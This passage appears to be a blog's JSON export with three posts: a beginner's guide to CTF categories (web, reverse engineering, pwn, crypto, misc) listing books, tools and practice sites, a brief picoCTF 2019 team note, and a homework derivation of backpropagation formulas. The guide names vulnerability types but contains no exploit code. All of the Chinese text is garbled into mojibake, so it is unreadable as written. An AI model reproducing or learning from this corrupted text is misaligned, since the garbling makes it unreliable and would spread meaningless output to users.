1.webçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼é¦–å…ˆï¼Œå¤§ç•¥è¿‡ä¸€ä¸‹æœ€åŸºç¡€çš„è¯­è¨€è¯­æ³•HTMLï¼CSSã€JavaScriptã€PHPã€SQLçš„åŸºæœ¬çŸ¥è¯†ï¼ˆå¹³å‡ä¸€ä¸ªè¯­è¨€4å°æ—¶è¶³çŸ£ï¼‰ï¼Œè¦åšåˆ°çœ‹åˆ°è¿™äº›ä»£ç çš„æ—¶å€™ä¸ä¼šç•æƒ§ï¼Œèƒ½çœ‹æ‡‚å¤§éƒ¨åˆ†ï¼Œçœ‹åˆ°ä¸æ‡‚çš„èƒ½é€šè¿‡googleæˆ–è€…ç›¸å…³æ–‡æ¡£æŸ¥æ‡‚ã€‚ä¸»è¦å‚è€ƒï¼šhttp://www.w3school.com.cn/ ã€http://www.runoob.com/ , è¿™é‡Œä¸è¦æ±‚å­¦å¾ˆæ·±ï¼Œå¾ˆæµ…å¾ˆæµ…å°±è¡Œï¼Œåé¢è¾¹å­¦è¾¹ç”¨æŒæ¡çš„ä¼šæ›´å¿«ã€‚ ç°åœ¨ï¼Œä½ åˆæ­¥äº†è§£äº†ä¸€äº›è¯­è¨€çŸ¥è¯†ï¼Œæ¥ä¸‹æ¥ä½ å°±éœ€è¦å¼€å§‹åœ¨å®è·µä¸­å­¦ä¹ ä¸å·©å›ºã€‚ å½“ç„¶å°±æ˜¯å®è·µäº†ã€‚è¿™é‡Œï¼Œæˆ‘å»ºè®®ä½ æ­å»ºä¸€ä¸ªä¸ªäººçš„åšå®¢ï¼Œåˆæ­¥äº†è§£è¿™äº›è¯­è¨€çš„åº”ç”¨ã€‚åœ¨æ­å»ºåšå®¢çš„è¿‡ç¨‹ä¸­ï¼Œä½ éœ€è¦å­¦ä¹ å¯¹åº”çš„linuxæ“ä½œã€Apache+PHP+Mysqlç¯å¢ƒçš„é…ç½®ã€åŸŸåè§£æã€æœåŠ¡å™¨ç«¯å£é…ç½®ç­‰ç­‰ã€‚å¦‚ä½•æ­å»ºåšå®¢ï¼Œè¯·è‡ªè¡Œgoogleæœç´¢ã€‚æ­¤å¤–ï¼Œä½ ä¹Ÿå¯ä»¥ç¼–å†™ä¸€äº›å¥½ç©çš„ç½‘é¡µæ¥å­¦ä¹ è¿™äº›çŸ¥è¯†ç‚¹ã€‚ å¦‚æœä½ èƒ½å®Œæˆå¦‚ä¸Šæ‰€è¯´çš„è¿™äº›ï¼Œå°¤å…¶æ˜¯ç¬¬ä¸‰ç‚¹ï¼Œé‚£ä¹ˆæ­å–œä½ ï¼Œä½ å…¥é—¨äº†ï¼Œå…¶å®è¿™äº›å‰æœŸä¼šé‡åˆ°å¾ˆå¤šè¯­è¨€æ–¹é¢éš¾å…ä¼šé‡åˆ°æŒ«æŠ˜ï¼Œä½†æ˜¯æ²¡å…³ç³»ï¼Œå¤šç™¾åº¦å¤šè°·æ­Œï¼Œå¤šç¾¤é‡Œæé—®ï¼Œæˆ‘ä»¬éƒ½ä¼šåŠæ—¶ç»™ä½ è§£ç­”ã€‚ æ¥ä¸‹æ¥å¯ä»¥äº†è§£åŸºæœ¬çš„HTTPåè®®ç›¸å…³çŸ¥è¯† æŒæ¡HTTPè¯·æ±‚ï¼šGETã€POSTã€HEADï¼Œèƒ½åŸºæœ¬è¯»æ‡‚ä¸€ä¸ªHTTPæ•°æ®åŒ…ï¼Œäº†è§£GETã€POSTã€HEADçš„åŒºåˆ« èƒ½çœ‹æ‡‚HTTPå“åº”åŒ… 404 403 200 500 302 301 â€¦ äº†è§£Cookieã€sessionã€tokenï¼ŒçŸ¥é“æ˜¯ä»€ä¹ˆä¸œè¥¿ï¼Œä½œç”¨æ˜¯ä»€ä¹ˆï¼Œä¸ºä»€ä¹ˆéœ€è¦è¿™äº›ä¸œè¥¿ äº†è§£Refererã€X-Forwarded-Forç­‰ç­‰çš„ä½œç”¨ å­¦æ¼æ´çŸ¥è¯†ç‚¹ä¹‹å‰ï¼Œå¦‚æœä½ äº†è§£äº†å¦‚ä¸Šæ‰€è¯´çš„ä¸€äº›ä¸œè¥¿ï¼Œé‚£ä¹ˆå°±å¯ä»¥å­¦ä¹ ä¸‹é¢çš„çŸ¥è¯†(è¿›é˜¶)å•¦ï¼Œå½“ç„¶èƒ½å­¦æ‡‚ä¸Šé¢çš„çŸ¥è¯†å¯èƒ½éœ€è¦å¤§æ¦‚3å‘¨å·¦å³çš„æ—¶é—´ï¼Œå¤šåšæŒï¼Œå¤šæé—®ã€‚ sqlæ³¨å…¥ XSSæ”»å‡» æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ–‡ä»¶åŒ…å«æ¼æ´ å‘½ä»¤æ‰§è¡Œæ¼æ´ ã€‚ã€‚ã€‚ æ¨èä¸€äº›å­¦ä¹ ç«™ç‚¹https://ctf-wiki.github.io/ctf-wiki/&gt; https://xz.aliyun.com/ https://www.anquanke.com/ https://github.com/CHYbeta/Web-Security-Learning æ¨èä¸€äº›é¢˜åº“https://cgctf.nuptsast.com/login https://www.jarvisoj.com/login æ¨èä¸€äº›å¤§ç‰›çš„åšå®¢https://chybeta.github.io/ https://www.jianshu.com/u/bf30f18c872c https://skysec.top/ https://lorexxar.cn/ æ¨èä¹¦ç±ã€Šç™½å¸½å­è®²webå®‰å…¨ã€‹ ã€Šé»‘å®¢æ”»é˜²æŠ€æœ¯å®å…¸Â·Webå®æˆ˜ç¯‡ã€‹ 2.Reverseçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼é€†å‘å·¥ç¨‹ï¼ŒReverseï¼Œç¼©å†™ä¸€èˆ¬ä¸ºReã€‚æ—¨åœ¨ä¸çŸ¥æ™“æºç çš„æƒ…å†µä¸‹å¯¹ç¨‹åºè¿›è¡Œåˆ†æï¼Œè·å–å…¶æµç¨‹ï¼Œç»„ç»‡ï¼Œç»“æ„ç­‰ã€‚CTFä¸­ä¸€èˆ¬ä¸ºæ³¨å†Œæœºè¿™ç§å½¢å¼ã€‚ æœ€å¥½ä¼šCè¯­è¨€å’Œæ±‡ç¼–è¯­è¨€ï¼Œä¸å¿…ç³»ç»Ÿçš„å­¦ä¹ æ±‡ç¼–ï¼Œä¸Šæ¥å…ˆä¸€æ¡ä¸€æ¡æŸ¥æŒ‡ä»¤æ‰‹å†Œï¼Œç­‰ç†Ÿæ‚‰äº†å†ä»”ç»†å­¦ä¹ ã€‚ éœ€äº†è§£å¸¸è§åŠ å¯†ç®—æ³•çš„å®ç°ï¼Œè¦åšåˆ°å¿«é€Ÿè¯†åˆ«ï¼Œæ— éœ€äº†è§£æ”»å‡»è¿‡ç¨‹ã€‚ å¦‚ä½•å­¦ä¹ é€†å‘å‘¢ï¼Œå¯ä»¥çœ‹ä¸‹é¢è¿™åŸºæœ¬ä¹¦å­¦ä¹ åŸºç¡€çŸ¥è¯†ï¼ŒåŒæ—¶æ‰“æ¯”èµ›åˆ·é¢˜ï¼Œä»¥èµ›å¸¦ç»ƒã€‚ æ¨èä¹¦ç± ã€Šæ±‡ç¼–è¯­è¨€ã€‹ï¼ˆç‹çˆ½ï¼‰ è¿™æœ¬æ¯”è¾ƒè€äº†ï¼Œè®²çš„8086æ±‡ç¼–ï¼Œä½†æ˜¯è®²çš„å¾ˆå¥½ã€‚ ã€ŠåŠ å¯†ä¸è§£å¯†ã€‹ï¼ˆç¬¬å››ç‰ˆï¼‰ï¼ˆçœ‹é›ªè®ºå›ï¼‰ çœ‹é›ªå‡ºçš„ç»å…¸ä¹¦ç±ï¼Œåå«åŠ å¯†ä¸è§£å¯†å®é™…ä¸Šæ˜¯è®²é€†å‘ã€‚å„æ–¹å„é¢éƒ½æœ‰è®²åˆ°ï¼Œå¾ˆå…¨é¢ã€‚ ã€Šé€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†ã€‹ ä¸»è¦æ˜¯windowsé€†å‘ï¼Œä»¥ODä¸ºä¸»è¦å·¥å…·ã€‚è®²çš„å¾ˆå¥½ï¼Œé¢å‘é›¶åŸºç¡€ã€‚ ä¸‹é¢çš„æˆ‘æ²¡çœ‹è¿‡ï¼Œä¸å¥½è¯„ä»·ã€‚ã€‚ã€‚ ã€ŠReverse Engineering for Beginnersã€‹(ç”µå­ä¹¦ï¼šhttps://beginners.re/)ï¼ˆä¸­æ–‡ç‰ˆä¸ºã€Šé€†å‘å·¥ç¨‹æƒå¨æŒ‡å—ã€‹ï¼‰ ã€ŠAndroidåº”ç”¨å®‰å…¨é˜²æŠ¤å’Œé€†å‘åˆ†æã€‹ ã€ŠAndroidè½¯ä»¶å®‰å…¨ä¸é€†å‘åˆ†æã€‹ å¸¸ç”¨å·¥å…· IDA Pro æå…¶å¼ºå¤§çš„åæ±‡ç¼–/åç¼–è¯‘/è°ƒè¯•å·¥å…·ï¼ŒäºŒè¿›åˆ¶é€‰æ‰‹å¿…é¡»ä¼šç”¨ï¼Œä¼˜ç§€çš„äºŒè¿›åˆ¶é€‰æ‰‹èƒ½æŠŠIDAè¿ç”¨åˆ°å‡ºç¥å…¥åŒ–çš„åœ°æ­¥ã€‚æœ‰å…³IDAçš„ä½¿ç”¨èƒ½è®²å¥½å¤šå¥½å¤šã€‚ å¾çˆ±ç ´è§£è®ºå›çˆ±ç›˜ä¸‹è½½ã€‚ x64dbg Windowså¹³å°ä¼˜ç§€çš„å¼€æºåæ±‡ç¼–å™¨åŠè°ƒè¯•å™¨ï¼Œå¯ä»¥çœ‹ä½œOlly dbgçš„å‡çº§ç‰ˆï¼ŒåŸºæœ¬åŒ…å«ODçš„å…¨éƒ¨åŠŸèƒ½ï¼Œä¸”ä¸€ç›´åœ¨æ›´æ–° å®˜ç½‘ä¸‹è½½ã€‚ gdb Linuxçš„è°ƒè¯•å™¨ï¼Œæ²¡æœ‰GUIã€‚pwné€‰æ‰‹å¿…é¡»æŒæ¡çš„æŠ€èƒ½ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨IDAçš„è¿œç¨‹è°ƒè¯•åŠŸèƒ½è°ƒè¯•linxç¨‹åºã€‚ ä¸€èˆ¬çš„Linuxè‡ªå¸¦ï¼Œæ²¡æœ‰çš„è¯aptå®‰è£…ã€‚ Jeb apkåç¼–è¯‘å·¥å…·ï¼ŒåŠŸèƒ½å¼ºå¤§ã€‚ jadx å¼€æºçš„apkåç¼–è¯‘å·¥å…·ï¼Œè½»é‡çº§ å…¶ä»– dnSpyï¼Œxspyï¼ŒCFF explorerç­‰å„ç±»ä¸“ç”¨å·¥å…·ï¼Œéœ€è¦é åšé¢˜ä¸­ç§¯ç´¯ã€‚ è®ºå›ä¸ç«™ç‚¹ æ±‡ç¼–è¯­è¨€æŒ‡ä»¤å­¦ä¹ ï¼šhttps://www.cnblogs.com/del/category/121079.html è¿™ä¸€ç³»åˆ—æ–‡ç« ç»†è‡´çš„è®²è§£äº†win32æ±‡ç¼–ï¼Œé‡åˆ°ä¸è®¤è¯†çš„æŒ‡ä»¤å¯åˆ°è¿™é‡ŒæŸ¥è¯¢ï¼ˆå½“ç„¶ç›´æ¥ç¿»intelæŒ‡ä»¤æ‰‹å†Œæ˜¯æœ€å‡†ç¡®çš„ï¼‰ å¾çˆ±ç ´è§£ï¼šçŸ¥åç ´è§£è®ºå›ï¼Œæ³¨å†Œæœ‰é™åˆ¶ï¼Œéœ€è¦10å…ƒæ³¨å†Œæˆ–ç­‰å¼€æ”¾ã€‚å¾çˆ±çš„çˆ±ç›˜å†…æœ‰å¤§é‡å¸¸ç”¨å·¥å…·ï¼Œä»¥åŠé€†å‘ä¸“ç”¨è™šæ‹Ÿæœºï¼Œå¯æŒ‰éœ€å­¦ä¹ ä¸ä½¿ç”¨ã€‚ https://www.52pojie.cn/ çœ‹é›ªè®ºå›ï¼šçŸ¥åé€†å‘è®ºå› https://bbs.pediy.com/ å®‰å…¨å®¢ã€å…ˆçŸ¥ç­‰å„ç±»å®‰å…¨è®ºå›ï¼Œä¸Šé¢æœ‰å„ç§å¤§ä½¬å‘çš„æ–‡ç« ã€‚ 3.PWNçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼pwnï¼ŒåŠpwn to ownï¼Œåœ¨é»‘å®¢ä¿šè¯­ä¸­ç”±ownæ¼”å˜è€Œæ¥ã€‚é€šè¿‡é€†å‘åˆ†æäºŒè¿›åˆ¶ç¨‹åºï¼Œå‘ç°å…¶å¯èƒ½å­˜åœ¨çš„æ¼æ´ï¼Œå¹¶è¿›è¡Œåˆ©ç”¨ï¼Œä»è€Œè¾¾åˆ°ä¿¡æ¯æ³„éœ²ã€æƒé™è·å–ç­‰ç›®çš„ã€‚ éœ€è¦æŒæ¡æ±‡ç¼–è¯­è¨€ã€åŸºç¡€é€†å‘æ–¹æ³•ã€‚ å…¥é—¨æ¨èåˆ°CTF wikiçš„pwnæ¿å—å­¦ä¹ ï¼Œä¸Šé¢æœ‰æå…¶è¯¦ç»†çš„pwnæ•™ç¨‹ï¼Œå„ç±»æ¼æ´ç‚¹åŠåˆ©ç”¨ã€‚ CTFä¸€èˆ¬ä¸ºlinuxç¯å¢ƒä¸‹çš„pwnï¼Œè¦ç†Ÿæ‚‰linuxçš„ä½¿ç”¨ã€‚ IDA Pro å¼ºå¤§çš„åç¼–è¯‘å·¥å…·ï¼Œæœ‰äº†å®ƒå°±èƒ½è½»æ¾å®¡è®¡æ¼æ´äº†ã€‚ gdbä¸ºåšpwné¢˜æ—¶è°ƒè¯•å¿…å¤‡çš„å·¥å…·ï¼Œç½‘ä¸Šæœ‰éå¸¸å¤šå…³äºgdbçš„æ•™ç¨‹ã€‚ pwndbgâ€”â€”gdbæ’ä»¶ï¼šhttps://github.com/pwndbg/pwndbg pwntoolsä¸ºä¸“é—¨ç”¨æ¥åšpwné¢˜çš„å·¥å…·ï¼Œæ‰€ä»¥è¦å­¦ä¹ pythonä¸pwntoolsã€‚ å…¶ä½™å­¦ä¹ æ•™ç¨‹ï¼š ä¸€æ­¥ä¸€æ­¥å­¦ROPç³»åˆ—ï¼šhttp://wooyun.jozxing.cc/static/drops/tips-6597.html http://wooyun.jozxing.cc/static/drops/papers-7551.html http://wooyun.jozxing.cc/static/drops/binary-10638.html http://wooyun.jozxing.cc/static/drops/papers-11390.html å †åŸºç¡€å­¦ä¹ : glibcå†…å­˜ç®¡ç†ptmallocæºä»£ç åˆ†æ.pdf linuxå†…æ ¸æºç (å»ºè®®ç›´æ¥çœ‹malloc freeæºç ) å †åŸºç¡€(è‹±æ–‡blog) æ¨èä¹¦ç±ï¼š ã€Šæ·±å…¥ç†è§£è®¡ç®—æœºç³»ç»Ÿï¼ˆåŸä¹¦ç¬¬3ç‰ˆï¼‰ã€‹ ã€Šç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»â€”é“¾æ¥ã€è£…è½½ä¸åº“ã€‹ 4.Cryptoçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼å¯†ç å­¦éœ€è¦è¾ƒå¼ºçš„æ•°å­¦åŸºç¡€ã€‚ctf wikiä¹Ÿæ˜¯å…¥é—¨ä¸é”™çš„é€‰æ‹©ã€‚ äº†è§£å„ç§å¯†ç çš„å®ç°è¿‡ç¨‹ï¼Œç›¸å…³çš„æ”»å‡»æ–¹æ³•ã€‚ å„ç§å¯†ç æ¨èç›´æ¥åˆ°è‹±æ–‡ç»´åŸºå­¦ä¹ ï¼Œè®²çš„ååˆ†è¯¦ç»†ï¼Œä¸€èˆ¬ä¹Ÿä¼šæœ‰æºä»£ç ã€‚ ä¸Šæ¥å­¦ä¹ å¯†ç å­¦å¯ä»¥æŠ„è„šæœ¬ï¼Œä¸ç”¨å¤ªå…³å¿ƒå…¶æ•°å­¦åŸç†ã€‚ç­‰æ·±å…¥äº†è§£åå†è¯¦ç»†ç ”ç©¶ã€‚ å¤å…¸å¯†ç â€”â€”è„‘æ´å¤§å¼€çš„å¯†ç ï¼šé“¾æ¥ RSAæ”»å‡»æ±‡æ€»ï¼šhttps://xz.aliyun.com/t/2446#toc-32 RSAcoppersmithsæ”»å‡»ï¼šhttps://github.com/mimoo/RSA-and-LLL-attacks ä¸€å †å¯†ç å­¦çš„é¢˜ç›®ï¼šhttps://cryptopals.com/ æ¨èä¹¦ç±ï¼š ã€Šæ·±å…¥æµ…å‡ºå¯†ç å­¦â€”â€”å¸¸ç”¨åŠ å¯†æŠ€æœ¯åŸç†ä¸åº”ç”¨ã€‹ ã€Šå¯†ç ç¼–ç å­¦ä¸ç½‘ç»œå®‰å…¨â€”â€”åŸç†ä¸å®è·µï¼ˆç¬¬ä¸ƒç‰ˆã€‹ ã€Šå›¾è§£å¯†ç æŠ€æœ¯ã€‹ ã€Šåº”ç”¨å¯†ç å­¦ï¼šåè®®ã€ç®—æ³•ä¸Cæºç¨‹åºã€‹ 5.Miscçš„è¯¦ç»†å…¥é—¨æŒ‡å¯¼æ‚é¡¹ï¼Œç®€ç§°Miscã€‚æ‚é¡¹çš„å†…å®¹å¾ˆå¤šå¾ˆå¹¿ï¼Œéœ€è¦é€‰æ‰‹æœ‰è¾ƒå¤§çš„çŸ¥è¯†é¢ä»¥åŠå¿«é€Ÿå­¦ä¹ æ–°é²œäº‹ç‰©çš„èƒ½åŠ›ã€‚ ä¸€èˆ¬åŒ…æ‹¬å–è¯ï¼Œéšå†™åˆ†æï¼Œç¼–ç è½¬æ¢ï¼Œä¿¡æ¯æ”¶é›†ï¼Œæµé‡åˆ†æç­‰ã€‚æœ‰æ—¶å¯†ç å­¦ä¸­çš„å¤å…¸å¯†ç ä¹Ÿè¢«æ”¾åˆ°æ‚é¡¹é‡Œå»ã€‚å…¶ä¸­å–è¯ä¸éšå†™æ˜¯miscæœ€é‡è¦çš„ä¸€å—ã€‚éœ€è¦é€‰æ‰‹æŒæ¡å„ç§èŠ±å¼éšå†™å¥—è·¯ï¼Œéœ€æœ‰è¾ƒå¼ºçš„è„šæœ¬åŠŸåº•ï¼Œä¼šç”¨å„ç±»éšå†™å·¥å…·ã€‚ éšå†™ https://www.jianshu.com/p/02fdd5edd9fcæµé‡åˆ†æ ã€ŠWiresharkç½‘ç»œåˆ†æå°±è¿™ä¹ˆç®€å•ã€‹ctf-wiki: https://ctf-wiki.github.io/ctf-wiki/misc/introduction-zh/ é€‚åˆèŒæ–°åˆ·é¢˜å…¥é—¨ä¼ é€é—¨ æ”»é˜²ä¸–ç•Œ æœ‰èŒæ–°åŒº 2019ä¸­ç§‘å¤§ctfæ–°ç”Ÿèµ› å—äº¬é‚®ç”µå¤§å­¦ç½‘ç»œæ”»é˜²å¹³å° è¾ƒå¤šä¸ºç®€å•é¢˜ picoCTF2018å’Œ2019 ç¾å›½é¢å‘é«˜ä¸­ç”Ÿçš„ctfæ¯”èµ› 2018ä¸­ç§‘å¤§ctfæ–°ç”Ÿèµ› githubå­˜æ¡£","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"å…¥é—¨","slug":"ctf/å…¥é—¨","permalink":"https://tari.moe/categories/ctf/%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"å…¥é—¨","slug":"å…¥é—¨","permalink":"https://tari.moe/tags/%E5%85%A5%E9%97%A8/"}]},{"title":"2019picoå°æ±‡æ€»","slug":"2019pico","date":"2019-10-13T04:51:51.000Z","updated":"2021-04-04T05:09:49.334Z","comments":true,"path":"2019/10/13/2019pico/","link":"","permalink":"https://tari.moe/2019/10/13/2019pico/","excerpt":"","text":"å’Œä¸¤ä½æ–°è®¤è¯†çš„å°ä¼™ä¼´ä¸€èµ·ç©äº†1å¤©ï¼Œè™½ç„¶è§£å‡ºæ¥çš„é¢˜ä¸ç®—å¾ˆå¤šï¼Œä½†ç©çš„è¿˜æ˜¯å¾ˆå¼€å¿ƒã€‚picoctfç›¸å¯¹æ¥è¯´ä¹Ÿä¼šç®€å•äº›ï¼Œä½†æ˜¯ä¹Ÿè¿˜æ˜¯æœ‰æ”¶è´§çš„ã€‚åœ¨æ­¤è®°å½•ä¸€ä¸‹ã€‚ç”±äºå›½åº†æ¯”è¾ƒå¿™ï¼Œä¹Ÿæ²¡æœ‰ç»§ç»­åœ¨è§£é¢˜äº†ï¼Œç„¶åä¹Ÿå¿˜äº†å†™è®°å½•äº†ï¼Œemmmã€‚ä¸‹å›¾æ˜¯æˆ‘ä»¬é˜Ÿä¼çš„1å¤©çš„è§£é¢˜æˆæœã€‚è¿™æ˜¯æŠ¥äº†å°ä¼™ä¼´çš„å¤§è…¿@guoguo @å›å¿† è¿‡äº›å¤©å†è¡¥ä¸Šå¿ƒå¾—ï¼Œ2333","categories":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/categories/ctf/"},{"name":"æ¯”èµ›","slug":"ctf/æ¯”èµ›","permalink":"https://tari.moe/categories/ctf/%E6%AF%94%E8%B5%9B/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://tari.moe/tags/ctf/"},{"name":"æ¯”èµ›","slug":"æ¯”èµ›","permalink":"https://tari.moe/tags/%E6%AF%94%E8%B5%9B/"}]},{"title":"è®¡ç®—æ™ºèƒ½å…¥é—¨ä½œä¸š","slug":"è®¡ç®—æ™ºèƒ½å…¥é—¨","date":"2019-10-03T16:35:37.000Z","updated":"2021-04-02T02:14:27.800Z","comments":true,"path":"2019/10/04/è®¡ç®—æ™ºèƒ½å…¥é—¨/","link":"","permalink":"https://tari.moe/2019/10/04/%E8%AE%A1%E7%AE%97%E6%99%BA%E8%83%BD%E5%85%A5%E9%97%A8/","excerpt":"","text":"è€å¸ˆå¸ƒç½®çš„ä½œä¸š æè¿° BP ç¥ç»ç½‘ç»œï¼ˆBPNNï¼‰çš„è®­ç»ƒè¿‡ç¨‹ï¼Œæ¨å¯¼ 3 å±‚ BPNN è°ƒæ•´ç½‘ç»œæƒé‡å’Œåç½®é‡çš„å…¬å¼ã€‚ è¿™å…¬å¼æ¨å¯¼æœ‰ç‚¹éš¾åº¦â€¦ :(ç„¶åç½‘ä¸ŠæŸ¥äº†è®¸å¤šèµ„æ–™ï¼Œæœ‰ä¸¤ä¸ªæ”¶è·: ç¥ç»ç½‘ç»œåœ¨éšè—å±‚åšäº†ä»€ä¹ˆ æŠŠå¤©å¤©å¬é—»çš„çº¿æ€§ä»£æ•°å¯¹ç¥ç»ç½‘ç»œé‡è¦æ€§è”ç³»åœ¨ä¸€èµ· éšè—å±‚ï¼šè¯¥å±‚å¯ä»¥è¯´æ˜¯ç¥ç»ç½‘ç»œçš„å…³é”®ï¼Œç›¸å½“äºå¯¹æ•°æ®åšä¸€æ¬¡ç‰¹å¾æå–ã€‚éšè—å±‚çš„æ„ä¹‰ï¼Œæ˜¯æŠŠå‰ä¸€å±‚çš„å‘é‡å˜æˆæ–°çš„å‘é‡ã€‚å°±æ˜¯åæ ‡å˜æ¢ï¼Œè¯´äººè¯å°±æ˜¯æŠŠæ•°æ®åšå¹³ç§»ï¼Œæ—‹è½¬ï¼Œä¼¸ç¼©ï¼Œæ‰­æ›²ï¼Œè®©æ•°æ®å˜å¾—çº¿æ€§å¯åˆ†ã€‚å¯èƒ½è¿™ä¸ªä¸é‚£ä¹ˆå¥½ç†è§£ï¼Œä¸¾ä¸ªæ —å­ï¼š ä¸‹é¢çš„å›¾å·¦ä¾§æ˜¯åŸå§‹æ•°æ®ï¼Œè¦æŠŠç»¿ç‚¹å’Œçº¢ç‚¹åˆ†å‰²å¼€ï¼Œè¦æ€ä¹ˆåšå‘¢ï¼Ÿ ä¸Šé¢äºŒå›¾å¯ä»¥åœ¨è¿™ç© ä¸€ç§åšæ³•ï¼šæŠŠå·¦å›¾çš„å¹³é¢çœ‹æˆä¸€å—å¸ƒï¼ŒæŠŠå®ƒç¼åˆæˆä¸€ä¸ªé—­åˆçš„åŒ…åŒ…ï¼ˆç›¸å½“äºæ•°æ®å˜æ¢åˆ°äº†ä¸€ä¸ª3ç»´åæ ‡ç©ºé—´ï¼‰ï¼Œç„¶åæŠŠæœ‰ç»¿è‰²ç‚¹çš„éƒ¨åˆ†æ’¸åˆ°é¡¶éƒ¨ï¼ˆä¼¸ç¼©å’Œæ‰­æ›²ï¼‰ï¼Œç„¶åå¤–å›´çš„çº¢è‰²ç‚¹è‡ªç„¶åœ¨å¦ä¸€ç«¯äº†ï¼Œè¦æ˜¯å§¿åŠ¿è¿˜ä¸å¤Ÿå¸…ï¼Œå°±æŒªæŒªä½ç½®ï¼ˆå¹³ç§»ï¼‰ã€‚è¿™æ—¶å€™å¹²è„†åˆ©è½çš„ç ä¸€åˆ€ï¼Œç»¿ç‚¹çº¢ç‚¹å°±å½»åº•åŒºåˆ†å¼€äº†ã€‚ è®ºçº¿æ€§ä»£æ•°çš„é‡è¦æ€§ï¼Œè”ç³»ä¸èµ·æ¥å¯æ¥è¿™é‡Œè¡¥è¯¾bç«™çº¿æ€§ä»£æ•°çš„æœ¬è´¨ å…³äºçº¿æ€§å˜æ¢åˆ°3ç»´ç©ºé—´ ä¸åŒç»´åº¦çš„å˜æ¢æ˜¯åˆç†çš„ ä¾‹å¦‚ä¸‹é¢è¿™ä¸ªçŸ©é˜µï¼Œå®ƒçš„å‡ ä½•æ„ä¹‰å°±æ˜¯å°†äºŒç»´ç©ºé—´æ˜ å°„åˆ°ä¸‰ç»´ç©ºé—´ä¸Š $$ \\begin{bmatrix} 3 &amp; 1\\ 4 &amp; 1\\ 5 &amp; 9 \\end{bmatrix} $$ å› ä¸ºçŸ©é˜µæœ‰ä¸¤åˆ—è¡¨é¢è¾“å…¥ç©ºé—´æœ‰ä¸¤ä¸ªåŸºå‘é‡ï¼Œ æœ‰ä¸‰è¡Œè¡¨ç¤ºæ¯ä¸€ä¸ªåŸºå‘é‡åœ¨å˜æ¢åéƒ½ç”¨ä¸‰ä¸ªç‹¬ç«‹çš„åæ ‡æ¥æè¿° æ‰€ä»¥å®ƒä»¬ä¸€å®šè½åœ¨ä¸‰ç»´ç©ºé—´ä¸­ï¼Œå› æ­¤è¿™æ˜¯ä¸€ä¸ªä»äºŒç»´ç©ºé—´åˆ°ä¸‰ç»´ç©ºé—´çš„å˜æ¢ ä¸å¤ªç†è§£å¯ä»¥çœ‹æ­¤è§†é¢‘ bç«™çº¿æ€§ä»£æ•°çš„æœ¬è´¨-ç¬¬å››ç«  å†å¦‚ä¸‹é¢è¿™ä¸ªçŸ©é˜µ $$ \\begin{bmatrix} 3 &amp; 1 &amp; 4\\ 1 &amp; 5 &amp; 9 \\end{bmatrix} $$ çŸ©é˜µä¸‰åˆ—è¡¨ç¤ºåŸå§‹ç©ºé—´æœ‰ä¸‰ä¸ªåŸºå‘é‡ï¼Œä¹Ÿå°±æ˜¯è¯´åŸå§‹ç©ºé—´æ˜¯ä¸‰ç»´ æœ‰ä¸¤è¡Œè¡¨æ˜è¿™ä¸‰ä¸ªåŸºå‘é‡åœ¨å˜æ¢åéƒ½ä»…ç”¨ä¸¤ä¸ªåæ ‡æ¥æè¿° æ‰€ä»¥å®ƒä»¬ä¸€å®šè½åœ¨äºŒç»´ç©ºé—´ä¸­ï¼Œå› æ­¤è¿™æ˜¯ä¸€ä¸ªä»ä¸‰ç»´ç©ºé—´åˆ°äºŒç»´ç©ºé—´çš„å˜æ¢ ä¸€ä¸ªäºŒç»´å‘é‡è¾“å…¥åˆ°ä¸‰ç»´å‘é‡è¾“å‡º:$$\\begin{bmatrix}3\\1\\end{bmatrix}\\rightarrow L\\left ( \\vec{\\nu} \\right ) \\rightarrow \\begin{bmatrix}1\\8\\2\\end{bmatrix}$$ å›æƒ³çº¿æ€§ä»£æ•°ï¼Œ$ L\\left ( \\vec{\\nu} \\right ) $ æ˜¯ä¸€ä¸ª3è¡Œ2åˆ—çš„çŸ©é˜µåˆ™ $ L\\left ( \\vec{\\nu} \\right ) $ ä¹˜ä»¥2è¡Œ1åˆ—(3,1)çš„çŸ©é˜µå°±æ˜¯ä»¥å®ƒä¸ºåŸºå‘é‡ä½œåŸºå˜æ¢å¾—åˆ°çš„ç»“æœå°±æ˜¯å‡ç»´åˆ°ä¸‰ç»´ç©ºé—´åçš„å‘é‡ # å¹å®Œæ°´äº†ï¼Œå¼€å§‹æ¨å¯¼å…¬å¼â€¦hexo æ”¯æŒLaTexå‚è€ƒé“¾æ¥ ä¸‰å±‚ BPNN è°ƒæ•´ç½‘ç»œæƒé‡å’Œåç½®é‡çš„å…¬å¼åˆ†åˆ«ä¸º$$ \\omega_{ij}=\\omega_{ij} + \\Delta \\omega_{ij} = \\omega_{ij} + (\\eta)O_{i}E_{j} \\qquad (1) $$$$ b_{j}=b_{j} + \\Delta b_{j} = b_{j} + (\\eta)E_{j} \\qquad\\quad\\quad (2) $$ å…¶ä¸­ï¼š $\\omega_{ij}$ è¡¨ç¤ºè¾“å…¥å±‚åˆ°éšå«å±‚çš„æƒé‡ï¼Œ$\\eta$ è¡¨ç¤ºå­¦ä¹ ç‡ $O_{i}$ è¡¨ç¤ºä¸Šä¸€å±‚å•å…ƒiçš„è¾“å‡ºï¼Œ$E_{j}$ è¡¨ç¤ºjå±‚ç¥ç»å…ƒè¯¯å·® $b_{j}$ è¡¨ç¤ºjå•å…ƒåç½®é‡(è‡³äºä¸ºä»€ä¹ˆå–åä¸ºbï¼Œä¸‹é¢æœ‰æåˆ°) ç°éœ€è¦æ¨å¯¼(1)(2)å¼å­ç­‰å·æˆç«‹ å…ˆå–æ¿€æ´»å‡½æ•°$$f(x)=\\frac{1}{1+e^{-x}}$$ ç”±ä¸Šå›¾é™¤äº†è¾“å…¥å±‚çš„ç¥ç»å…ƒï¼Œæ¯ä¸ªç¥ç»å…ƒéƒ½ä¼šæœ‰åŠ 